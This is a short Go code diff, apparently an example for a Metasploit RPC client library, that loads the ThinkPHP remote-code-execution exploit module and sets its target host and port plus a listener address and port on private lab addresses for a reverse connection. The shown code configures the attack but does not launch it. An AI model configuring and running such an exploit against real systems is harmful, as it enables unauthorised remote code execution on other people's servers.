@@ -35,7 +35,17 @@ func main() {
 	//})
 
 	exploit, err := client.Module.UseExploit("unix/webapp/thinkphp_rce")
-	options := exploit.Options()
+	err = exploit.Set("RHOSTS", "192.168.100.149")
+	if err != nil {
+		fmt.Println(err)
+	}
+	exploit.Set("RPORT", "8081")
+	exploit.Set("TARGETURI", "/")
+	exploit.Set("SRVHOST", "0.0.0.0")
+	exploit.Set("SRVPORT", "8080")
+	exploit.Set("LHOST", "192.168.0.199")
+	exploit.Set("LPORT", "4444")
+	//options := exploit.OptionsAdvanced()
 	//detail := exploit.OptionsDetail()
-	fmt.Printf("%#v", options)
+	fmt.Println(exploit.Get("RHOSTS"))
 }
